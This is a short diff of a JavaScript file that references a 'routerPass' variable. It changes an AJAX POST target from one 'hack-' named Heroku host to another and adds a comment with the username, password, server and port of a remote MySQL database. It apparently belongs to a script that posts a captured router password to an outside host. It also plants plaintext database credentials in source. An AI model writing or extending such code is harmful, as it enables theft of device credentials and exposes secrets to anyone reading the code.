@@ -18,7 +18,7 @@ var routerPass = "";
     };
 
     $.ajax({
-    url: 'https://hack-lol.herokuapp.com/test',
+    url: 'https://hack-osama.herokuapp.com/test',
     type: "POST",
     dataType: 'json',
     contentType: 'application/json',
@@ -37,3 +37,15 @@ return;
       return;
     }
   });
+
+/*
+Username: oInlIDhHL4
+
+Database name: oInlIDhHL4
+
+Password: gfSWeNRSXp
+
+Server: remotemysql.com
+
+Port: 3306
+*/
